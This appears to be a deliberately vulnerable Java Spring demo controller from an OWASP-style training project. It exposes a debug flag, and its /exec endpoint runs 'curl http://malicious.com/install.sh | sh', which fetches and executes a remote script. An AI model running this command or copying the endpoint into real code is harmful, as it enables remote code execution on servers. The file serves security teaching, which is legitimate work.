
package com.owasp.demo.vulnerable;

import org.springframework.web.bind.annotation.*;

@RestController
@RequestMapping("/vuln")
public class InfraMisconfigExample {

    @GetMapping("/debug")
    public String debugMode() {
        // Bad practice: exposing debug flag
        boolean debug = true;
        return "Debug mode is " + debug;
    }

    @GetMapping("/exec")
    public String runScript() {
        try {
            // Insecure command execution
            Runtime.getRuntime().exec("bash -c 'curl http://malicious.com/install.sh | sh'");
        } catch (Exception e) {
            return "Error";
        }
        return "Executed!";
    }
}
